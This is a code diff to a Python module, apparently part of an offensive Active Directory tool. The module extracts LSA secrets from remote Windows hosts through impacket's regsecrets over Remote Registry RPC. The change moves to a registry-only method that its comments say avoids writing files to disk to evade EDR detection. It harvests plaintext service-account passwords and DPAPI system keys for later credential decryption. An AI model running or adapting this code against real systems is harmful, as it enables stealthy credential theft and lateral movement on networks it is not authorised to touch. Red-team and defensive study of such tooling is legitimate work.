@@ -1,15 +1,20 @@
-# Remote LSA secret extraction for service credentials.
+# Registry-only LSA secret extraction.
 #
-# Uses impacket's RemoteOperations and LSASecrets classes to extract
-# _SC_<ServiceName> secrets from the SECURITY registry hive. Only
-# extracts secrets for services that were already identified as running
-# domain accounts (targeted extraction, not a full secretsdump).
+# Uses impacket's regsecrets module to extract LSA secrets via Remote
+# Registry RPC (REG_OPTION_BACKUP_RESTORE). This approach reads secrets
+# directly from the SECURITY registry hive without saving temp files to
+# disk, eliminating the primary EDR detection vector of traditional
+# secretsdump.
 #
-# The extraction requires local admin access and uses the Remote Registry
-# service (started temporarily if needed, restored to original state).
+# Network footprint: \pipe\svcctl (start RemoteRegistry) + \pipe\winreg
+# (registry queries). No files written to ADMIN$ or C$.
+#
+# Extracts:
+#   - _SC_<ServiceName> secrets → service account passwords
+#   - DPAPI_SYSTEM → dpapi_machinekey + dpapi_userkey (for task DPAPI decryption)
 
 import contextlib
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Any, List, Optional, Set
 
 from ..utils.logging import debug as log_debug
@@ -26,141 +31,155 @@ class ServiceCredential:
     lsa_secret_name: str  # _SC_<ServiceName>
 
 
-def extract_service_credentials(
+@dataclass
+class LSAExtractionResult:
+    """Complete result from LSA secret extraction."""
+
+    service_credentials: List[ServiceCredential] = field(default_factory=list)
+    dpapi_userkey: Optional[str] = None  # hex string, e.g. "0x1a2b3c..."
+    dpapi_machinekey: Optional[str] = None  # hex string
+    raw_secrets: List[str] = field(default_factory=list)  # all captured secret strings
+
+
+def extract_lsa_secrets(
     smb: Any,
     host: str,
     service_names: Optional[Set[str]] = None,
     kerberos: bool = False,
     dc_host: Optional[str] = None,
-) -> List[ServiceCredential]:
+) -> LSAExtractionResult:
     """
-    Extract plaintext passwords from _SC_* LSA secrets.
+    Extract LSA secrets via registry-only approach (no disk writes).
 
-    Uses impacket's secretsdump infrastructure to:
-    1. Enable Remote Registry (if not running)
-    2. Save SECURITY + SYSTEM hives (or use registry RPC)
-    3. Extract boot key from SYSTEM
-    4. Decrypt LSA secrets from SECURITY
-    5. Filter for _SC_* entries matching discovered services
-    6. Restore Remote Registry to original state
+    Uses impacket's regsecrets module which reads the SECURITY registry
+    hive directly via Remote Registry RPC with REG_OPTION_BACKUP_RESTORE
+    to bypass ACLs. The RemoteRegistry service is started if needed and
+    restored to its original state afterward.
+
+    Returns both service credentials (_SC_* secrets) and DPAPI system
+    keys (DPAPI_SYSTEM secret) in a single extraction pass.
 
     Args:
         smb: Authenticated SMBConnection
         host: Target hostname (for logging)
-        service_names: Set of service names to extract (if None, extract all _SC_*)
+        service_names: Set of service names to match _SC_* secrets against
         kerberos: Whether Kerberos auth is being used
         dc_host: DC hostname for Kerberos
 
     Returns:
-        List of ServiceCredential with decrypted passwords
+        LSAExtractionResult with service credentials and DPAPI keys
     """
-    from impacket.examples.secretsdump import LSASecrets, RemoteOperations
+    from impacket.examples.regsecrets import LSASecrets, RemoteOperations
 
     remote_ops = None
     lsa_secrets = None
-    credentials: List[ServiceCredential] = []
-    captured_secrets: List[tuple] = []
+    result = LSAExtractionResult()
+    captured: List[tuple] = []
 
-    def _secret_callback(secret_type, secret: str) -> None:
-        """Capture LSA secrets via callback."""
-        captured_secrets.append((secret_type, secret))
+    def _callback(secret_type, secret: str) -> None:
+        """Capture all LSA secrets via callback."""
+        captured.append((secret_type, secret))
 
     try:
-        info(f"{host}: Starting LSA secret extraction...")
+        info(f"{host}: Starting registry-only LSA extraction (no disk writes)...")
 
-        # Initialize RemoteOperations (handles Remote Registry lifecycle)
+        # Initialize RemoteOperations — registry-only, no hive saves
         remote_ops = RemoteOperations(smb, kerberos, kdcHost=dc_host)
         remote_ops.enableRegistry()
-        log_debug(f"{host}: Remote Registry enabled")
+        log_debug(f"{host}: RemoteRegistry enabled for LSA extraction")
 
-        # Get boot key from SYSTEM hive
+        # Extract boot key from SYSTEM registry via remote registry queries
         boot_key = remote_ops.getBootKey()
-        log_debug(f"{host}: Boot key extracted")
+        log_debug(f"{host}: Boot key extracted from SYSTEM registry")
 
-        # Save SECURITY hive and initialize LSA decryptor
-        remote_ops.saveSECURITY()
-        log_debug(f"{host}: SECURITY hive saved")
-
-        security_file = remote_ops.getSecurityHive()
-
+        # Decrypt LSA secrets from SECURITY registry — all via RPC, no files
         lsa_secrets = LSASecrets(
-            security_file,
             boot_key,
             remoteOps=remote_ops,
-            isRemote=True,
-            perSecretCallback=_secret_callback,
+            perSecretCallback=_callback,
         )
-
-        # Dump all LSA secrets (filtered via callback)
         lsa_secrets.dumpSecrets()
-        log_debug(f"{host}: LSA secrets dumped ({len(captured_secrets)} raw entries)")
+        log_debug(f"{host}: LSA secrets extracted ({len(captured)} entries)")
 
-        # Filter and parse _SC_* secrets
-        for _secret_type, secret_str in captured_secrets:
-            if not secret_str or ":" not in secret_str:
+        # Parse captured secrets
+        for _secret_type, secret_str in captured:
+            if not secret_str:
                 continue
 
-            # secret_str format for _SC_ secrets: "account:password"
-            # The secret name is tracked by impacket internally
-            # We need to match against our discovered service names
-            parts = secret_str.split(":", 1)
-            if len(parts) != 2:
+            result.raw_secrets.append(secret_str)
+
+            # Parse DPAPI_SYSTEM secret
+            if "dpapi_userkey:" in secret_str:
+                for line in secret_str.split("\n"):
+                    line = line.strip()
+                    if line.startswith("dpapi_userkey:"):
+                        result.dpapi_userkey = line.split(":", 1)[1]
+                        log_debug(f"{host}: Captured DPAPI userkey")
+                    elif line.startswith("dpapi_machinekey:"):
+                        result.dpapi_machinekey = line.split(":", 1)[1]
+                        log_debug(f"{host}: Captured DPAPI machinekey")
                 continue
 
-            account, password = parts
-
-            # Skip if password is empty
-            if not password or password == "(Unknown User):":
+            # Parse _SC_* service credentials (format: "account:password")
+            if ":" not in secret_str:
                 continue
 
-            # Try to find which service this credential belongs to
-            # by checking captured_secrets for the _SC_ prefix context
-            # impacket logs the secret name before the callback
-            credentials.append(ServiceCredential(
-                service_name="",  # Will be matched later
+            account, password = secret_str.split(":", 1)
+            if not password or not account:
+                continue
+
+            # Skip non-credential secrets (machine account hashes, etc.)
+            if account.startswith("$MACHINE.ACC") or account.startswith("ASPNET"):
+                continue
+
+            result.service_credentials.append(ServiceCredential(
+                service_name="",  # Will be matched below
                 account=account,
                 password=password,
                 lsa_secret_name="",
             ))
 
-        # Now match credentials to service names using RemoteOperations
-        # The getServiceAccount method maps service names to accounts
-        matched_credentials: List[ServiceCredential] = []
+        # Match credentials to service names via SCM lookup
         if service_names and hasattr(remote_ops, "getServiceAccount"):
+            matched: List[ServiceCredential] = []
             for svc_name in service_names:
-                lsa_key = f"_SC_{svc_name}"
-                # Look for a credential matching this service's account
-                svc_account = remote_ops.getServiceAccount(svc_name)
+                try:
+                    svc_account = remote_ops.getServiceAccount(svc_name)
+                except Exception:
+                    svc_account = None
+
                 if svc_account:
-                    for cred in credentials:
-                        if cred.account.lower() == svc_account.lower() or cred.account == "(Unknown User)":
-                            matched_credentials.append(ServiceCredential(
+                    for cred in result.service_credentials:
+                        cred_user = cred.account.split("\\")[-1].lower() if "\\" in cred.account else cred.account.lower()
+                        svc_user = svc_account.split("\\")[-1].lower() if "\\" in svc_account else svc_account.lower()
+                        if cred_user == svc_user or cred.account == "(Unknown User)":
+                            matched.append(ServiceCredential(
                                 service_name=svc_name,
                                 account=svc_account,
                                 password=cred.password,
-                                lsa_secret_name=lsa_key,
+                                lsa_secret_name=f"_SC_{svc_name}",
                             ))
                             break
 
-        # If we couldn't match via service account, return all _SC_ secrets
-        if not matched_credentials:
-            # Fall back to returning all captured credentials
-            matched_credentials = credentials
+            if matched:
+                result.service_credentials = matched
 
-        if matched_credentials:
-            good(f"{host}: Extracted {len(matched_credentials)} service credential(s) from LSA secrets")
-        else:
-            info(f"{host}: No service credentials found in LSA secrets")
+        # Report results
+        if result.service_credentials:
+            good(f"{host}: Extracted {len(result.service_credentials)} service credential(s)")
+        if result.dpapi_userkey:
+            good(f"{host}: Extracted DPAPI system key (auto-feed for task credential decryption)")
+        if not result.service_credentials and not result.dpapi_userkey:
+            info(f"{host}: No service credentials or DPAPI keys found in LSA secrets")
 
-        return matched_credentials
+        return result
 
     except Exception as e:
-        warn(f"{host}: LSA secret extraction failed: {e}")
+        warn(f"{host}: LSA extraction failed: {e}")
         log_debug(f"{host}: LSA extraction error: {type(e).__name__}: {e}")
-        return []
+        return result
 
     finally:
-        # Clean up: close LSA, restore Remote Registry state
         if lsa_secrets:
             with contextlib.suppress(Exception):
                 lsa_secrets.finish()
@@ -168,3 +187,16 @@ def extract_service_credentials(
             with contextlib.suppress(Exception):
                 remote_ops.finish()
         log_debug(f"{host}: LSA extraction cleanup complete")
+
+
+# Legacy alias for backwards compatibility with Phase 5 code
+def extract_service_credentials(
+    smb: Any,
+    host: str,
+    service_names: Optional[Set[str]] = None,
+    kerberos: bool = False,
+    dc_host: Optional[str] = None,
+) -> List[ServiceCredential]:
+    """Extract service credentials only (legacy wrapper)."""
+    result = extract_lsa_secrets(smb, host, service_names, kerberos, dc_host)
+    return result.service_credentials
